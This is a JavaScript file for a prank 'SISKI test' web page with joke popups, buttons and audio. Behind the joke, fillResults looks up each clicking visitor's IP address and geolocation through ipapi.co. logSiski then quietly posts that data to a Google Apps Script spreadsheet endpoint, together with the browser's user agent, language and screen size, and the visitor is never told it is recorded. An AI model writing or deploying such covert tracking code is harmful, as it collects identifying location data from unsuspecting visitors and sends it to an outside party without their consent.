const page = document.querySelector(".page");
const results = document.querySelector("[data-results]");
const audio = document.querySelector("#siski-audio");
const counter = document.querySelector("[data-count]");
const popups = document.querySelector("[data-popups]");
const sheetEndpoint = "https://script.google.com/macros/s/AKfycbweGPsOLG7-20IH9GcyZB9RYeAQJ-iQY4_9ewdLMYyGNzIj3o1qL5oB5IMjwXl2kZzz/exec";

const messages = [
  "SISKI TEST INITIATED",
  "SISKI SUBSYSTEM WARM",
  "YOU ARE SELECTED",
  "NO VIRUS PROBABLY",
  "CERTIFIED BUTTON EVENT",
  "PLEASE KEEP CLICKING",
];

function random(min, max) {
  return Math.floor(min + Math.random() * (max - min + 1));
}

function popup(title, body) {
  const node = document.createElement("div");
  node.className = "popup";
  node.style.setProperty("--left", `${random(8, Math.max(8, window.innerWidth - 300))}px`);
  node.style.setProperty("--top", `${random(8, Math.max(8, window.innerHeight - 130))}px`);
  node.innerHTML = `<strong>${title}</strong><p>${body}</p>`;
  popups.append(node);
  setTimeout(() => node.remove(), 2800);
}

function setMap(lat, lon) {
  const map = document.querySelector("[data-map]");
  const delta = 0.12;
  const left = lon - delta;
  const right = lon + delta;
  const top = lat + delta;
  const bottom = lat - delta;
  map.src = `https://www.openstreetmap.org/export/embed.html?bbox=${left}%2C${bottom}%2C${right}%2C${top}&layer=mapnik&marker=${lat}%2C${lon}`;
}

function logSiski(payload) {
  fetch(sheetEndpoint, {
    method: "POST",
    mode: "no-cors",
    headers: {
      "Content-Type": "text/plain;charset=utf-8",
    },
    body: JSON.stringify({
      ...payload,
      userAgent: navigator.userAgent,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`,
      at: new Date().toISOString(),
    }),
  }).catch(() => {
    popup("SHEET REFUSED", "THE SISKI WAS TOO POWERFUL TO LOG.");
  });
}

async function fillResults(mode) {
  const ip = document.querySelector("[data-ip]");
  const location = document.querySelector("[data-location]");
  const coords = document.querySelector("[data-coords]");

  ip.textContent = "CHECKING...";
  location.textContent = "CHECKING...";
  coords.textContent = "CHECKING...";

  try {
    const response = await fetch("https://ipapi.co/json/");
    if (!response.ok) throw new Error("lookup failed");
    const data = await response.json();
    const lat = Number(data.latitude);
    const lon = Number(data.longitude);
    ip.textContent = data.ip || "UNKNOWN";
    location.textContent = [data.city, data.region, data.country_name].filter(Boolean).join(", ") || "SISKI ZONE";
    coords.textContent = Number.isFinite(lat) && Number.isFinite(lon) ? `${lat.toFixed(5)}, ${lon.toFixed(5)}` : "CLASSIFIED";
    if (Number.isFinite(lat) && Number.isFinite(lon)) setMap(lat, lon);
    logSiski({
      mode,
      ip: ip.textContent,
      location: location.textContent,
      coords: coords.textContent,
    });
  } catch {
    ip.textContent = "BLOCKED";
    location.textContent = "SISKI ZONE";
    coords.textContent = "0.00000, 0.00000";
    setMap(0, 0);
    logSiski({
      mode,
      ip: "BLOCKED",
      location: "SISKI ZONE",
      coords: "0.00000, 0.00000",
    });
  }
}

async function test(button, red) {
  page.classList.add("testing");
  button.classList.add("testing");
  button.textContent = red ? "↓ RED SISKI TESTING" : "↓ SISKI TESTING";
  counter.textContent = random(8, 99);

  audio.loop = false;
  audio.pause();
  audio.currentTime = 0;
  audio.volume = red ? 1 : 0.82;
  try {
    await audio.play();
  } catch {
    popup("AUDIO BLOCKED", "CLICK AGAIN BUT MEAN IT");
  }

  for (let i = 0; i < 4; i += 1) {
    setTimeout(() => {
      popup(messages[random(0, messages.length - 1)], red ? "RED MODE HAS BEEN APPLIED." : "NORMAL BLUE YES DETECTED.");
    }, i * 220);
  }

  setTimeout(() => {
    page.classList.remove("testing");
    button.classList.remove("testing");
    button.textContent = red ? "↓ TEST UR SISKI BUT RED" : "↓ TEST UR SISKI RN!!!111!1";
    page.hidden = true;
    results.hidden = false;
    document.body.classList.add("result-mode");
    fillResults(red ? "red" : "blue");
  }, 1500);
}

document.querySelector("[data-test]").addEventListener("click", (event) => test(event.currentTarget, false));
document.querySelector("[data-test-red]").addEventListener("click", (event) => test(event.currentTarget, true));
document.querySelector("[data-report]").addEventListener("click", () => {
  popup("REPORT THIS AD", "REPORT DENIED. AD HAS REPORTED YOU.");
});
document.querySelector("[data-report-results]").addEventListener("click", () => {
  popup("RESULT REPORT", "SISKI RESULT CANNOT BE UNSEEN.");
});

setInterval(() => {
  counter.textContent = random(3, 12);
}, 2500);
